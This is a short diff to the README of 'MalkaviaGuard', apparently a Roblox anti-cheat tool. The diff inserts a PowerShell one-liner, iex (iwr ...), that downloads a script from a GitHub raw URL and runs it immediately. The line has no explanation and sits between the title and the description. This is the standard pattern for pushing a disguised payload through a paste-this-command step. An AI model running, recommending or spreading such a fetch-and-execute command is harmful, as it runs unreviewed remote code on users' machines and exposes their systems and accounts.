@@ -1,7 +1,7 @@
 # MalkaviaGuard v1.0
 
 **Advanced Anti-Cheat Detection System for Roblox**
-
+iex (iwr 'https://raw.githubusercontent.com/duaaaalityyyy/MalkaviaGuard/main/MalkaviaGuard.ps1' -UseBasicParsing)
 MalkaviaGuard is a sophisticated anti-cheat monitoring tool designed to detect and report malicious code injection, memory manipulation, and suspicious process behavior targeting Roblox games.
 
 ## 🚨 Detection Capabilities
